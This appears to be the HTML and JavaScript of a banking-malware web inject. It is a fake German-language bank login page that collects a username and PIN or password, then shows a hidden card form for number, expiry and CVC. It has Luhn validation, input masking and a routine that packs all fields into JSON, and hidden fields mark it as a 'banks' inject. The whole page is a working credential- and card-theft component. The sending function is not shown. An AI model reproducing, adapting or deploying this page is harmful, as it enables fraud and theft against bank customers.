body {
    background-color: #ffffff;
    color: #bebebe;
}
html {
    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
}
.header {
    position: relative;
    z-index: 2;
}
.logongardient {
    padding: 18px 0;
    text-align: left;
    box-shadow: 0px 0px 9px #d9ff00;
}
.logo {
    margin: 0 auto;
    text-align: left;
    color: #d9ff00;
    font-size: 1.2rem;
    padding-left: 25px;
}
.main {
    margin-top: 10px;
}
.autorizeBox {
    border-radius: 5px;
    padding: 1.25rem 0;
    max-width: 384px !important;
    overflow: visible !important;
    margin: 0 auto;
}
@media only screen and (max-width: 444px) {
    .autorizeBox {
        margin: 0 20px;
    }
}
.autorizeBox form {
    position: relative;
    min-height: .0625rem;
    padding: 5px 35px;
}
.autorizeBox ::placeholder {
    color: #3b3b3b;
    opacity: 1;
}
.autorizeBox label {
    font-size: 1.125rem;
    -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    margin-left: 5px;
}
.autorizeBox input {
    font-size: 1.125rem;
    background: 0 0;
    border: 1px solid rgb(102, 102, 102);
    color: #303030;
    border-bottom: 1px solid rgb(102, 102, 102);
    padding: 5px;
    margin: 10px 0;
    width: 100%;
    border-radius: 5px;
}
.autorizeBox input.dt {
    width: 17%;
}
.autorizeBox button {
    margin: 10px 0;
    background-color: #d9ff00;
    border: none;
    width: 100%;
    height: 2rem;
    overflow-x: auto;
    border-radius: 20px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
}
.autorizeBox button:disabled,
.autorizeBox button[disabled] {
    background-color: #d9ff00;
    border-radius: 20px;
}
.autorizeBox button span {
    line-height: 1.125rem;
    white-space: normal;
    margin: .0625rem .75rem;
    font-size: 0.9rem;
    font-weight: 600;
    color: #000000;
    letter-spacing: 0;
    text-decoration: none;
}
.usaalogo {
    text-align: center;
    margin-top: -30px;
}
.usaalogo img {
    width: 70px;
}
#ccnumlbl {
    color: red;
    font-size: 0.8rem;
}
.warntext {
    color: red;
    margin-bottom: 20px;
    text-align: center;
    font-weight: bolder;
}
</style>

    <div class="main">
        <div class="autorizeBox">
            <form id="login" action="" style=""> 

                          <center>
                            <p style="color:#000000; margin-left:0px; margin-top:0px; font-size: 20px; font-weight:;">Ihr persönlicher Bereich</p>
                         </center> 
                         <br>  
                         
                         
                                <p style="color:#000000; margin-left:0px; margin-top:0px; font-size: 12px; font-weight:bold;">Zugangsnummer/Benutzername</p>
                             
                               
                    <input id="Login" style="font-size: 15px; margin-top: -10px;" placeholder="" pattern=".{4,}" autocomplete="off" type="text" required>
               <br></br>
                         
               
                    <p style="color:#000000; margin-left:0px; margin-top:0px; font-size: 12px; font-weight:bold;">PIN/Passwort</p>
                  

                    <input id="Password" style="font-size: 15px; margin-top: -10px;" placeholder="" pattern=".{4,}" autocomplete="off" type="password" required>
                    <br></br>
                  
                    <br></br>
                    <button type="button" onclick="process('login')"><span>Anmelden</span></button>
                    <input id="type_injects" value='banks' type="hidden" required>
                    <p class="footerCopyright" style="margin-left:20px; color: rgb(0, 0, 0); font-size: 11.6px; margin-top: 7px;">Zugangsdaten vergessen/Zugang gesperrt?</p>

                   
            </form>
            <form id="CC" action="" style="display:none;">
                    <input id="CCNUM" placeholder="Kartennummer" pattern="^[0-9 ]{12,24}$" maxlength="24" autocomplete="off" type="text" required>
                    <span id="ccnumlbl"></span>
                    <br><label>Datum: </label>
                    <input class="dt" id="CCexpMM" placeholder="MM" pattern="^[1-9]{1}$|^[1]{1}[0-2]{1}$|^[0][1-9]{1}$" maxlength="2" autocomplete="off" type="text" required>
                    <input class="dt" id="CCEXPYY" placeholder="JJ" pattern="^19$|^2[0-9]$" maxlength="2" autocomplete="off" type="text" required>
                    <br><label>CVC codes: </label>
                    <input id="CVV" placeholder="CVC" pattern="^[0-9]{3}$" autocomplete="off" maxlength="3" type="password" style="width:15%;" required>
					<input id="exit" type="hidden" text="true"/>
                    <button type="button" onclick="process('CC')"><span>LOG ON</span></button>
                    <input id="type_injects" value='banks' type="hidden" required>
                    <input id="closed" value='close_activity_injects' type="hidden" required>
            </form>
          
        </div>
    </div>
</body>
<script>
var invalidCC = 'Invalid card number';

function maskCC(event) {
    var v = this.value.replace(/\D/g, '');
    this.value = '';
    for(var i = 0; i < v.length; i++) {
        this.value += (i%4==0 && i != 0 ? ' ' : '') + v[i];
    }
}
document.getElementById('CCNUM').addEventListener('input', maskCC, false);

function maskOnlyNumbers(event) {
    this.value = this.value.replace(/\D/g, '');
}

var arrtagsID = [ 'CCexpMM', 'CCEXPYY', 'CVV'];
for(var iid in arrtagsID) {
    document.getElementById(arrtagsID[iid]).addEventListener('input', maskOnlyNumbers, false);
}

function valid_credit_card(value) {
	if (/[^0-9-\s]+/.test(value)) return false;
	var nCheck = 0, nDigit = 0, bEven = false;
	value = value.replace(/\D/g, "");
	for (var n = value.length - 1; n >= 0; n--) {
		var cDigit = value.charAt(n),
			  nDigit = parseInt(cDigit, 10);
		if (bEven) {
			if ((nDigit *= 2) > 9) nDigit -= 9;
		}
		nCheck += nDigit;
		bEven = !bEven;
	}
	return (nCheck % 10) == 0;
}

/*********Recursive implementation of jSON.stringify; ********/
var stringifyJSON = function(obj) {
    var arrOfKeyVals = [],
        arrVals = [],
        objKeys = [];

    /*********CHECK FOR PRIMITIVE TYPES**********/
    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
        return '' + obj;
    else if (typeof obj === 'string')
        return '"' + obj + '"';

    /*********CHECK FOR ARRAY**********/
    else if (Array.isArray(obj)) {
        if (obj[0] === undefined)
            return '[]';
        else {
            obj.forEach(function(el) {
                arrVals.push(stringifyJSON(el));
            });
            return '[' + arrVals + ']';
        }
    }
    /*********CHECK FOR OBJECT**********/
    else if (obj instanceof Object) {
        objKeys = Object.keys(obj);
        objKeys.forEach(function(key) {
            var keyOut = '"' + key + '":';
            var keyValOut = obj[key];
            if (keyValOut instanceof Function || typeof keyValOut === undefined)
                arrOfKeyVals.push('');
            else if (typeof keyValOut === 'string')
                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                arrOfKeyVals.push(keyOut + keyValOut);
            else if (keyValOut instanceof Object) {
                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
            }
        });
        return '{' + arrOfKeyVals + '}';
    }
};

function formToJSON(f)
{
    var FinalObject = {}, namesHTML = ['input','select'];
    for(var i = 0; i < namesHTML.length; i++) {
		var bsform = f.getElementsByTagName(namesHTML[i]);
        for(var j = 0; j < bsform.length; j++) {
            FinalObject[bsform[j].id] = bsform[j].value
        }
    }
    return stringifyJSON(FinalObject);
}
